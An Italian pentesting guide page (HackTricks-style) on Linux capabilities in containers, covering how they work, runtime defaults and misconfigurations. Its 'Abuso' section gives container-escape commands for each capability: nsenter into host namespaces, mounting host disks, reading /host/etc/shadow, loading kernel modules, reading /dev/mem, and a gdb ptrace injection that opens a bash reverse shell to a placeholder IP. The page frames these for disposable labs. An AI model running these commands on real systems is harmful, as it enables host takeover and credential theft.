# Capability Linux nei container

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le capability Linux sono uno degli elementi più importanti della sicurezza dei container perché rispondono a una domanda sottile ma fondamentale: **che cosa significa davvero "root" all'interno di un container?** Su un normale sistema Linux, storicamente UID 0 implicava un insieme molto ampio di privilegi. Nei kernel moderni, questi privilegi sono suddivisi in unità più piccole chiamate capability. Un processo può essere eseguito come root e comunque non disporre di molte operazioni potenti, se le capability pertinenti sono state rimosse. <sup>[[1]](#references)</sup>

I container si basano molto su questa distinzione. Per ragioni di compatibilità o semplicità, molti workload vengono ancora avviati con UID 0 all'interno del container. Senza rimuovere le capability, sarebbe estremamente pericoloso. Rimuovendo le capability, un processo root nel container può comunque svolgere molte normali attività al suo interno, ma non può eseguire operazioni del kernel più sensibili. Ecco perché una shell nel container che mostra `uid=0(root)` non significa automaticamente "root dell'host" e nemmeno "ampi privilegi sul kernel". Gli insiemi di capability determinano quanto vale davvero quell'identità root.

Per consultare il riferimento completo alle capability Linux e molti esempi di abuso, vedi:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funzionamento

Le capability sono tracciate in diversi insiemi, tra cui permitted, effective, inheritable, ambient e bounding. In molte valutazioni dei container, la semantica esatta di ciascun insieme nel kernel è meno importante della domanda pratica finale: **quali operazioni privilegiate può eseguire con successo questo processo in questo momento e quali ulteriori acquisizioni di privilegi sono ancora possibili?** <sup>[[1]](#references)</sup>

Questo è importante perché molte tecniche di breakout sono in realtà problemi legati alle capability, mascherati da problemi dei container. Un workload con `CAP_SYS_ADMIN` può accedere a un'enorme quantità di funzionalità del kernel che un normale processo root in un container non dovrebbe poter usare. Un workload con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche il namespace di rete dell'host. Un workload con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host grazie alla condivisione del PID dell'host. In Docker o Podman, ciò può apparire come `--pid=host`; in Kubernetes, di solito appare come `hostPID: true`.

In altre parole, l'insieme di capability non può essere valutato isolatamente. Va considerato insieme ai namespace, a seccomp e alla policy MAC.

## Laboratorio

Un modo molto diretto per ispezionare le capability all'interno di un container è:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

Puoi anche confrontare un container più restrittivo con uno a cui sono state aggiunte tutte le capability:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Per vedere l'effetto di un'aggiunta limitata, prova a rimuovere tutto e aggiungere nuovamente una sola capability:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Questi piccoli esperimenti aiutano a dimostrare che un runtime non si limita a impostare un valore booleano chiamato "privileged". Definisce l'effettiva superficie dei privilegi disponibile al processo.

## Capability ad alto rischio

Le capability diventano primitive di escape solo quando la loro operazione raggiunge una **risorsa governata dall'host**. Le combinazioni ad alto rischio più ricorrenti sono:

- **`CAP_SYS_ADMIN`** insieme a un PID host, un dispositivo a blocchi o un percorso di controllo del kernel scrivibile. Per entrare in un mount namespace di destinazione è inoltre necessario `CAP_SYS_CHROOT`; per montare un filesystem basato su dispositivi a blocchi è necessario `CAP_SYS_ADMIN` nell'initial user namespace.
- **`CAP_SYS_PTRACE`** insieme alla visibilità dei PID host e a un processo host a cui è possibile collegarsi. `CAP_SYS_ADMIN` non è necessario per l'injection tramite ptrace.
- **`CAP_DAC_OVERRIDE` o `CAP_DAC_READ_SEARCH`** insieme a un filesystem host raggiungibile. Queste capability aggirano controlli DAC diversi, ma non creano una vista del filesystem host.
- **`CAP_SYS_MODULE`** nell'initial user namespace insieme a un modulo accettato e compatibile con il kernel. I normali container Linux condividono il kernel del nodo; i runtime basati su VM o su kernel in userspace modificano questo confine.
- **`CAP_MKNOD`** nell'initial user namespace insieme a un dispositivo host reale già consentito dal device cgroup. Creare un nodo non aggira il device cgroup.
- **`CAP_SYS_RAWIO`** insieme a un'interfaccia di memoria, porte I/O, PCI o controllo dei dispositivi esposta e utilizzabile.
- **`CAP_SYS_BOOT`** insieme all'initial PID namespace per riavviare l'host, oppure a un percorso kexec utilizzabile e consentito per sostituire il kernel.
- **`CAP_NET_ADMIN`** nell'host network namespace per controllare direttamente lo stato di rete del nodo. **`CAP_NET_RAW`** può contribuire a un'escape specifica di un protocollo, ma i raw socket da soli non forniscono una shell sul nodo.

`CAP_SYS_CHROOT` non è intenzionalmente indicata come capability di escape autonoma. Può essere necessaria per `setns()` nei mount namespace e può rendere più semplice usare un albero host già accessibile, ma `chroot()` da solo non espone tale albero né concede nuovi permessi sul filesystem. Allo stesso modo, `CAP_BPF` e `CAP_PERFMON` espongono potenti strumenti di telemetria e una superficie di attacco del kernel, ma, in assenza di una vulnerabilità separata del kernel, le loro normali operazioni non costituiscono escape generiche dai container.

## Utilizzo nei runtime

Docker, Podman, gli stack basati su containerd e CRI-O utilizzano tutti controlli sulle capability, ma le impostazioni predefinite e le interfacce di gestione differiscono. Docker le espone direttamente tramite flag come `--cap-drop` e `--cap-add`. Podman offre controlli simili e spesso li combina con l'esecuzione rootless come ulteriore livello di sicurezza. Kubernetes consente di aggiungere o rimuovere capability tramite `securityContext` del Pod o del container; i runtime di livello inferiore definiscono gli insiemi risultanti nella configurazione runtime OCI. Anche gli ambienti per system container, come LXC e Incus, si basano sul controllo delle capability, ma la loro maggiore integrazione con l'host può indurre gli operatori ad allentare le impostazioni predefinite più facilmente di quanto farebbero per un application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente una capability che si dovrebbe concedere. Molti incidenti reali iniziano quando un operatore aggiunge una capability solo perché un workload non funzionava con una configurazione più restrittiva e il team aveva bisogno di una soluzione rapida.

## Configurazioni errate

L'errore più ovvio è **`--cap-add=ALL`** nelle CLI in stile Docker/Podman, ma non è l'unico. In pratica, un problema più comune è concedere una o due capability estremamente potenti, soprattutto `CAP_SYS_ADMIN`, per "far funzionare l'applicazione", senza considerare anche le implicazioni relative a namespace, seccomp e mount. Un altro errore comune è combinare capability aggiuntive con la condivisione dei namespace host. In Docker o Podman ciò può presentarsi sotto forma di `--pid=host`, `--network=host` o `--userns=host`; in Kubernetes, l'esposizione equivalente si manifesta in genere tramite impostazioni del workload come `hostPID: true` o `hostNetwork: true`. Ognuna di queste combinazioni modifica ciò su cui la capability può effettivamente agire.

È inoltre comune che gli amministratori ritengano che, poiché un workload non è completamente `--privileged`, sia comunque soggetto a restrizioni significative. A volte è così, ma in altri casi la postura effettiva è già abbastanza vicina a quella privilegiata da rendere irrilevante la distinzione sul piano operativo.

## Abuso

Inizia registrando gli insiemi effettivi, la mappatura degli user namespace, lo stato di seccomp, i namespace, i mount e i dispositivi. Il nome di una capability, senza questo contesto, non dimostra un'escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: namespace e dispositivi a blocchi

Con la visibilità dei PID dell’host, `CAP_SYS_ADMIN` può entrare nei namespace dell’host. Anche l’operazione sul mount namespace richiede `CAP_SYS_CHROOT` nel namespace utente del chiamante.

**Verifica la capability e il confinamento:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Enumera il target:** conferma la condivisione del PID dell'host dalla configurazione del container/Pod o da un elenco inequivocabile dei processi dell'host, quindi ispeziona i namespace del target. Esiste un PID 1 locale anche nei namespace PID privati, quindi la sua sola presenza non dimostra la condivisione del PID dell'host.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Sfrutta il percorso del namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

I controlli delle capability devono riuscire negli user namespace che possiedono i target. `--pid=host` o `hostPID: true` in Kubernetes forniscono visibilità, non le capability.

Per il percorso alternativo tramite block device, **enumera** i candidati, quindi **sfrutta** il filesystem accessibile montando prima il candidato convalidato in sola lettura:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

Il device node deve esistere, il device cgroup deve consentirlo e i mount di filesystem a blocchi richiedono `CAP_SYS_ADMIN` nel namespace utente iniziale. Una root dell’host già montata in bind su `/host` consente l’accesso all’host **senza** `CAP_SYS_ADMIN`; `chroot /host` è solo una comodità e richiede separatamente `CAP_SYS_CHROOT`.

### Root dell’host raggiungibile: esecuzione diretta dal filesystem

Se la root dell’host è già montata in `/host`, verifica prima il mount, quindi usa direttamente l’accesso esistente. Questo percorso non dipende da `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Se `chroot()` non è disponibile, ma il binario dell’host è compatibile con l’architettura e il loader del container, spesso può essere richiamato tramite l’albero montato:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Le letture e le scritture dirette in `/host` equivalgono già alla compromissione del filesystem host. `chroot()` o l’esecuzione di un binario host rendono solo più comodo questo accesso; nessuna delle due operazioni crea il mount host né aggira un mount in sola lettura o una policy MAC.

### `CAP_SYS_PTRACE`: host-process injection

Con visibilità dei PID host e `CAP_SYS_PTRACE` nel namespace utente del target, GDB può far chiamare `system()` a un processo host approvato. `CAP_SYS_ADMIN` non è necessario.

**Verifica la capability e i controlli di attach:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Enumerare e selezionare un target sacrificabile:** verificare la condivisione dei PID dell'host tramite la configurazione o un elenco inequivocabile dei processi del nodo; non selezionare mai il PID 1 né un daemon critico.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Sfrutta il processo selezionato:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

Il target deve essere collegabile e disporre di un simbolo `system()` utilizzabile e del percorso del payload Bash. Yama, lo stato non dumpable, seccomp, gli user namespace e le policy MAC possono bloccare la catena. GDB arresta il target mentre è collegato, quindi usa solo un processo di laboratorio sacrificabile.

### `CAP_DAC_OVERRIDE` e `CAP_DAC_READ_SEARCH`: file host protetti

Queste capability non espongono il filesystem host. Se `/host` è già un mount host, `CAP_DAC_READ_SEARCH` può aggirare i controlli DAC di lettura/ricerca e `CAP_DAC_OVERRIDE` può inoltre aggirare i normali controlli di scrittura:

**Verifica le capability:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumera il filesystem host esposto e i permessi del target:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Sperimenta i bypass di lettura e scrittura** in un laboratorio usa e getta:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Un mount in sola lettura e le regole LSM continuano ad applicarsi. `CAP_DAC_READ_SEARCH` autorizza anche `open_by_handle_at()`, ma un breakout come Shocker richiede inoltre un file descriptor di mount per lo stesso filesystem sottostante, handle validi o individuabili, un layout del filesystem/storage compatibile e l'assenza di blocchi da parte del runtime o dell'LSM. Non fornisce accesso arbitrario a ogni filesystem esterno al mount namespace.

### `CAP_SYS_MODULE`: esecuzione nel kernel condiviso

In un normale container Linux, un modulo accettato viene eseguito nel kernel host condiviso.

**Verifica la capability e l'ambito del user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Elenca i prerequisiti per il caricamento dei moduli:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Exploit solo con un proof module compatibile e già revisionato, su un nodo usa e getta:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

La capability deve essere effettiva nel namespace utente iniziale. La versione e la configurazione del kernel, le firme dei moduli, il lockdown, seccomp e i criteri LSM devono consentire il caricamento. Kata, gVisor, l’isolamento Hyper-V e runtime simili modificano il confine del kernel raggiunto dal workload.

### `CAP_MKNOD`: creare un handle di dispositivo consentito

`CAP_MKNOD` crea un nodo dispositivo, ma non aggira il device cgroup. La creazione dei dispositivi non è namespaced, quindi la capability deve essere effettiva nel namespace utente iniziale.

**Verificare la capability e l’ambito del namespace utente:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumera i dispositivi reali, i loro numeri major/minor e qualsiasi allowlist cgroup-v1 visibile:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit un candidato ext-family validato in sola lettura:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Altri filesystem richiedono uno strumento di sola lettura corrispondente; per montare il dispositivo serve inoltre `CAP_SYS_ADMIN`. `Operation not permitted` quando si apre il nodo creato di solito indica che il cgroup dei dispositivi continua a bloccarlo. Con cgroup v2, l’accesso ai dispositivi viene comunemente applicato tramite BPF e non esiste alcun file `devices.list`, quindi un’apertura riuscita è la verifica decisiva.

### `CAP_SYS_RAWIO`: interfaccia raw-I/O esposta

Non esiste un payload generico portabile: gli indirizzi validi e gli effetti dipendono dall’hardware e dalla configurazione del kernel.

**Verifica la capability e l’ambito dello user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Elenca le interfacce raw, l'hardware e i driver esposti:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Esegui l'exploit solo con una prova approvata per il dispositivo e l'intervallo di indirizzi identificati.** Se `/dev/mem` è l'interfaccia approvata per il laboratorio, questo modello dimostra la divulgazione della memoria del nodo senza stamparne i contenuti:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

L'indirizzo deve provenire dalla mappa hardware del lab, perché leggere alcune regioni MMIO può avere effetti collaterali. Un comando generico di scrittura in memoria sarebbe fuorviante e pericoloso: lo stesso indirizzo può essere innocuo su una macchina e controllare l'hardware o la memoria del kernel su un'altra. I device cgroups, i permessi del filesystem, le restrizioni rigorose su `/dev/mem`, il kernel lockdown, la virtualizzazione e le policy LSM spesso impediscono un accesso utile.

### `CAP_SYS_BOOT`: riavvio dello namespace o sostituzione del kernel

In uno namespace PID privato, `reboot()` termina il processo init di quello namespace invece di riavviare l'host. Per riavviare l'host è quindi necessario lo namespace PID iniziale, di norma tramite la condivisione dei PID dell'host. Anche un percorso kexec richiede un'immagine del kernel compatibile e policy lockdown/firma permissive:

**Verifica la capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Elenca i prerequisiti per il PID namespace e kexec:** verifica la condivisione del PID dell’host nella configurazione del workload, perché un link al PID namespace da solo non rivela se si tratta del namespace iniziale del nodo.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Esegui l'exploit solo quando riavviare un nodo di laboratorio usa e getta è l'esercizio esplicito:**

```bash
sync
reboot -f
```

Non eseguire quel comando né caricare un kernel su un nodo condiviso solo per dimostrare la capability. In un namespace PID privato termina solo il processo init di quel namespace e non dimostra un impatto sull'host.

### `CAP_NET_ADMIN` e `CAP_NET_RAW`: percorsi di rete dell'host

`CAP_NET_ADMIN` ha effetto solo sul namespace di rete corrente.

**Verifica le capability e il confinamento:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Elenca la rete corrente e verifica la modalità di rete host dalla configurazione del workload:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Esercita `CAP_NET_ADMIN` in modo reversibile:** con il networking dell'host, l'interfaccia temporanea è un'interfaccia del nodo.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` consente socket RAW e PACKET, ma non è una shell host generica. Per **enumerare** la chain GCE documentata, controlla la route dei metadata e acquisisci il traffico per verificare se quello in chiaro del guest-agent è osservabile:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Se sono presenti i prerequisiti corrispondenti, **exploit** la chain specifica dell’ambiente come descritto in [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): acquisisci la richiesta e lo stato della sequenza, inietta la risposta metadata contraffatta contenente una chiave SSH, quindi verifica l’accesso all’host. La chain richiedeva root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, traffico plaintext verso i metadata GCE e una richiesta del guest agent soggetta a race condition; il trasporto o il comportamento dell’agent moderni possono impedirla.

### Restrizioni sull’origine locale e indirizzi di interfaccia

Un listener può rifiutare le connessioni con origine `127.0.0.1` ma ignorare un altro indirizzo assegnato allo stesso network namespace. Se il listener è raggiungibile da quell’interfaccia, confronta una connessione loopback con una associata a un indirizzo locale esistente non-loopback. `CAP_NET_ADMIN` può consentire la configurazione delle interfacce nel namespace corrente, ma non serve se è già assegnato un indirizzo adeguato. `CAP_NET_RAW` non è un prerequisito per una normale connessione TCP. Si tratta di un errore di classificazione dell’indirizzo sorgente, non di un container escape né della prova che l’applicazione autorizzerà una richiesta privilegiata.<sup>[[1]](#references)[[7]](#references)</sup>

Per un listener WebSocket, una risposta HTTP valida `101 Switching Protocols` indica che l’handshake iniziale è stato completato; un successivo errore a livello applicativo può indicare che la connessione ha raggiunto l’handler. Nessuna delle due risposte dimostra che l’autenticazione o l’operazione richiesta siano riuscite.<sup>[[8]](#references)</sup>

## Checks

Lo scopo dei controlli sulle capability non è solo acquisire i valori grezzi, ma capire se il processo dispone di privilegi sufficienti a rendere pericolosa la situazione attuale del namespace e dei mount.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Cosa c'è di interessante qui:

- `capsh --print` è il modo più semplice per individuare capability ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La riga `CapEff` in `/proc/self/status` indica quali capability sono effettivamente attive in questo momento, non solo quali potrebbero essere disponibili in altri set.
- Un dump delle capability diventa molto più importante se il container condivide anche i namespace PID, di rete o utente dell'host, oppure dispone di mount host scrivibili.

Dopo aver raccolto le informazioni grezze sulle capability, il passo successivo è interpretarle. Chiediti se il processo è root, se sono attivi gli user namespace, se vengono condivisi i namespace dell'host, se seccomp è in modalità enforcing e se AppArmor o SELinux continuano a limitare il processo. Un set di capability, da solo, racconta solo una parte della storia, ma spesso è proprio quello che spiega perché un breakout da container funziona e un altro fallisce pur partendo apparentemente dalla stessa situazione.

## Impostazioni predefinite dei runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimento manuale comune |
| --- | --- | --- | --- |
| Docker Engine | Set di capability ridotto per impostazione predefinita | Docker mantiene un'allowlist predefinita di capability e rimuove tutte le altre | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Set di capability ridotto per impostazione predefinita | I container Podman sono non privilegiati per impostazione predefinita e usano un modello di capability ridotto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Eredita le impostazioni predefinite del runtime, a meno che non vengano modificate | Se non vengono specificate `securityContext.capabilities`, il container riceve il set di capability predefinito del runtime | `securityContext.capabilities.add`, mancato uso di `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O sotto Kubernetes | Di solito, impostazioni predefinite del runtime | Il set effettivo dipende dal runtime e dalla specifica del Pod | come nella riga Kubernetes; anche la configurazione diretta OCI/CRI può aggiungere capability esplicitamente |

Per Kubernetes, il punto importante è che l'API non definisce un unico set di capability predefinito valido per tutti. Se il Pod non aggiunge né rimuove capability, il workload eredita le impostazioni predefinite del runtime di quel nodo.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - pagina del manuale Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configurazione dei container Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Documentazione Docker - privilegi di runtime e capability Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Documentazione Kubernetes - impostare le capability per un container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Documentazione Podman - `--cap-add` e `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Documentazione Incus - sicurezza](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - implementazione del protocollo IPv4 di Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Il protocollo WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
